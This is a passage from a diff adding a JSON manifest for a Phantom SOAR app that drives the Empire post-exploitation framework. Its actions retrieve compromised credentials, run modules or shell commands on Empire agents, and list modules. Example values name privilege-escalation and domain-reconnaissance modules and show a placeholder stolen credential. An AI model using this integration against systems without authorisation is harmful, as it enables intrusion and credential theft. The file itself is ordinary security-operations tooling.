@@ -1,0 +1,4633 @@
+{
+    "appid": "e6fbad37-d1de-4c69-8227-9538b7934a85",
+    "name": "Empire",
+    "description": "This app supports a variety of actions to interact with the REST API of Empire - https://github.com/powershellempire/empire",
+    "type": "network security",
+    "product_vendor": "Empire",
+    "logo": "logo_powershellempire.svg",
+    "logo_dark": "logo_powershellempire_dark.svg",
+    "product_name": "Empire",
+    "product_version_regex": ".*",
+    "publisher": "Phantom",
+    "license": "Copyright (c) Phantom Cyber Corporation, 2018",
+    "app_version": "1.0.14",
+    "utctime_updated": "2018-01-12T01:44:25.000000Z",
+    "package_name": "phantom_empire",
+    "main_module": "empire_connector.pyc",
+    "min_phantom_version": "3.0.251",
+    "app_wizard_version": "1.0.0",
+    "configuration": {
+        "base_url": {
+            "description": "Base URL for the Empire REST API (e.g. https://192.168.1.1)",
+            "data_type": "string",
+            "required": true,
+            "order": 0
+        },
+        "port": {
+            "description": "Port that the Empire REST API is listening on (default: 1337)",
+            "data_type": "string",
+            "required": true,
+            "default": "1337",
+            "order": 1
+        },
+        "verify_server_cert": {
+            "description": "Verify Server Cert",
+            "data_type": "boolean",
+            "required": false,
+            "default": false,
+            "order": 2
+        },
+        "ph": {
+            "data_type": "ph",
+            "order": 3
+        },
+        "username": {
+            "description": "Username for accessing the Empire REST API",
+            "data_type": "string",
+            "required": true,
+            "order": 4
+        },
+        "password": {
+            "description": "Password for accessing the Empire REST API",
+            "data_type": "password",
+            "required": true,
+            "order": 5
+        }
+    },
+    "actions": [
+        {
+            "action": "test connectivity",
+            "identifier": "test_connectivity",
+            "description": "Validate the asset configuration for connectivity using supplied configuration",
+            "verbose": "",
+            "type": "test",
+            "read_only": true,
+            "parameters": {},
+            "output": [],
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get credentials",
+            "identifier": "get_credentials",
+            "description": "Get compromised credentials stored in Empire",
+            "verbose": "",
+            "type": "investigate",
+            "read_only": true,
+            "parameters": {},
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "status",
+                    "column_order": 0,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total creds: 2"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.username",
+                    "data_type": "string",
+                    "example_values": [
+                        "DESHAW\\herman"
+                    ],
+                    "contains": [
+                        "user name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.domain",
+                    "data_type": "string",
+                    "example_values": [
+                        "dc1.deshaw.com"
+                    ],
+                    "contains": [
+                        "domain"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.credtype",
+                    "data_type": "string",
+                    "example_values": [
+                        "plaintext"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.notes",
+                    "data_type": "string",
+                    "example_values": [
+                        "2017-11-16 09:17:50"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.host",
+                    "data_type": "string",
+                    "example_values": [
+                        "WIN-1DOIUPRU4D8"
+                    ],
+                    "contains": [
+                        "host name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.sid",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.password",
+                    "data_type": "string",
+                    "example_values": [
+                        "genericpassword"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.os",
+                    "data_type": "string",
+                    "example_values": [
+                        "Microsoft Windows 7 Ultimate "
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.creds.*.ID",
+                    "data_type": "numeric",
+                    "example_values": [
+                        3
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_creds",
+                    "data_type": "string",
+                    "example_values": [
+                        "2"
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "execute module",
+            "identifier": "execute_module",
+            "description": "Execute a module or run a shell command in Empire",
+            "verbose": "",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "module_name_or_command": {
+                    "description": "Name of module to execute or shell command to run",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire module name"
+                    ],
+                    "default": "",
+                    "order": 0
+                },
+                "agent_name": {
+                    "description": "Agent on which to execute module",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "default": "",
+                    "order": 1
+                },
+                "get_results": {
+                    "description": "Get results of module?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "primary": false,
+                    "default": true,
+                    "order": 2
+                },
+                "is_shell_command": {
+                    "description": "Is this a shell command?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "primary": false,
+                    "default": false,
+                    "order": 3
+                },
+                "options": {
+                    "description": "JSON of additional options for module",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": false,
+                    "order": 4
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.module_name_or_command",
+                    "data_type": "string",
+                    "contains": [
+                        "empire module name"
+                    ],
+                    "column_name": "Module Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "powershell/privesc/powerup/allchecks",
+                        "powershell/situational_awareness/network/powerview/get_loggedon"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.agent_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "column_name": "Agent Name",
+                    "column_order": 1,
+                    "example_values": [
+                        "CNEVH5SZ",
+                        "4E6L1STN",
+                        "Y6APU9DM",
+                        "REH2UG54"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.options",
+                    "data_type": "string",
+                    "column_name": "Options",
+                    "column_order": 2,
+                    "example_values": [
+                        "{'ComputerName': 'localhost'}"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 3,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Msg: tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks\nSuccess: True",
+                        "Msg: tasked agent 4E6L1STN to run module powershell/situational_awareness/network/powerview/get_loggedon\nTaskid: 10\nSuccess: True\nAgentname: 4E6L1STN",
+                        "Msg: tasked agent Y6APU9DM to run module powershell/situational_awareness/network/powerview/get_loggedon\nTaskid: 52\nSuccess: True\nAgentname: Y6APU9DM",
+                        "Msg: No message, Taskid: 13, Success: True, Agentname: REH2UG54"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.msg",
+                    "data_type": "string",
+                    "example_values": [
+                        "tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.taskID",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.msg",
+                    "data_type": "string",
+                    "example_values": [
+                        "tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks",
+                        "tasked agent 4E6L1STN to run module powershell/situational_awareness/network/powerview/get_loggedon",
+                        "tasked agent Y6APU9DM to run module powershell/situational_awareness/network/powerview/get_loggedon",
+                        "No message"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.results_lines",
+                    "data_type": "string",
+                    "example_values": [
+                        "\\nGet-NetLoggedon completed!"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.results_lines.*.line",
+                    "data_type": "string",
+                    "example_values": [
+                        "Job started: 416Y98",
+                        "CORP\\\\herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.get_results",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.taskID",
+                    "data_type": "numeric",
+                    "example_values": [
+                        10,
+                        52,
+                        13
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.AgentName",
+                    "data_type": "string",
+                    "example_values": [
+                        "4E6L1STN",
+                        "Y6APU9DM",
+                        "REH2UG54"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.is_shell_command",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get module",
+            "identifier": "get_module",
+            "description": "Get a module by name in Empire",
+            "verbose": "",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "module_name": {
+                    "description": "Name of module to get",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire module name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.module_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire module name"
+                    ],
+                    "column_name": "Module Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "powershell/situational_awareness/network/powerview/share_finder"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 1,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Needsadmin: False\nName: powershell/situational_awareness/network/powerview/share_finder\nLanguage: powershell"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Name",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell/situational_awareness/network/powerview/share_finder"
+                    ],
+                    "contains": [
+                        "empire module name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Language",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Author",
+                    "data_type": "string",
+                    "example_values": [
+                        "@herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.OpsecSafe",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Comments",
+                    "data_type": "string",
+                    "example_values": [
+                        "herman's comment"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.NeedsAdmin",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Background",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.MinLanguageVersion",
+                    "data_type": "string",
+                    "example_values": [
+                        "2"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Domain.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Domain.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The domain to use for the query, defaults to the current domain."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Domain.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.DomainController.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.DomainController.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Domain controller to reflect LDAP queries through."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.DomainController.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerName.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerName.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hosts to enumerate."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerName.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Agent to run module on."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Delay.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Delay.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Delay between enumerating hosts, defaults to 0."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Delay.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.CheckShareAccess.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.CheckShareAccess.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Only display found shares that the local user has access to."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.CheckShareAccess.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Threads.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Threads.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The maximum concurrent threads to execute."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Threads.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.NoPing.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.NoPing.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Don't ping each host to ensure it's up before enumerating."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.NoPing.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerFilter.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerFilter.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Host filter name to query AD for, wildcards accepted."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ComputerFilter.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Finds shares on machines in the domain. Part of PowerView."
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.Language",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.Name",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell/situational_awareness/network/powerview/share_finder"
+                    ],
+                    "contains": [
+                        "empire module name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.NeedsAdmin",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "list modules",
+            "identifier": "list_modules",
+            "description": "List all available modules in Empire",
+            "verbose": "This action also has an optional parameter to search for a module if you are not sure of the exact name.",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "search_string": {
+                    "description": "Option string to search for in module names",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": false,
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.search_string",
+                    "data_type": "string"
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string"
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total modules: 13"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Name",
+                    "data_type": "string",
+                    "example_values": [
+                        "herman edwards"
+                    ],
+                    "contains": [
+                        "empire module name"
+                    ],
+                    "column_name": "Module Name",
+                    "column_order": 0
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Language",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ],
+                    "column_name": "Module Language",
+                    "column_order": 1
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Author",
+                    "data_type": "string",
+                    "example_values": [
+                        "@herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.OpsecSafe",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ],
+                    "column_name": "Opsec Safe",
+                    "column_order": 2
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Comments",
+                    "data_type": "string",
+                    "example_values": [
+                        "another herman comment"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.NeedsAdmin",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ],
+                    "column_name": "Needs Admin",
+                    "column_order": 3
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Background",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.OutputExtension",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.MinLanguageVersion",
+                    "data_type": "string",
+                    "example_values": [
+                        "2.6"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Image.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Image.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Location of the image to use."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Image.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Login.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Login.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "True/False to change the login background."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Login.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Agent to run on."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Agent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Desktop.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Desktop.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "True/False to change the desktop background."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Desktop.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Change the login message for the user."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.LocalImagePath.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.LocalImagePath.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Local image path to set the agent wallpaper as."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.LocalImagePath.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Message.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Message.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Message text to display."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Message.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "A herman message."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.IconType.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.IconType.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Critical, Exclamation, Information, Key, or None"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.IconType.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Key"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Title.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Title.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Title of the message box to display."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Title.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Windows Explorer"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VoiceText.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VoiceText.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Text to synthesize on target."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VoiceText.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VideoURL.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VideoURL.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "A description"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.VideoURL.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Text.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Text.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The text to speak."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Text.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Voice.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Voice.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The voice to use."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Voice.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.MsgText.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.MsgText.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Message text to display."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.MsgText.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hello world"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ProcessName.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ProcessName.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Process name to kill on starting (wildcards accepted)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.ProcessName.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Sleep.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Sleep.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Time to sleep between checks."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Sleep.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "1"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Silent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Silent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Don't output kill messages."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Silent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Remove.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Remove.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "True/False to remove login message."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.modules.*.options.Remove.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_modules",
+                    "data_type": "numeric",
+                    "example_values": [
+                        13
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get results",
+            "identifier": "get_agent_results",
+            "description": "Get results from most recent agent command",
+            "verbose": "",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "agent_name": {
+                    "description": "Agent name for which to get results",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.agent_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "column_name": "Agent Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "CNEVH5SZ"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 1,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Agentresults: [u''], Agentname: CNEVH5SZ"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.results.*.AgentName",
+                    "data_type": "string",
+                    "example_values": [
+                        "CNEVH5SZ"
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.results.*.AgentResults",
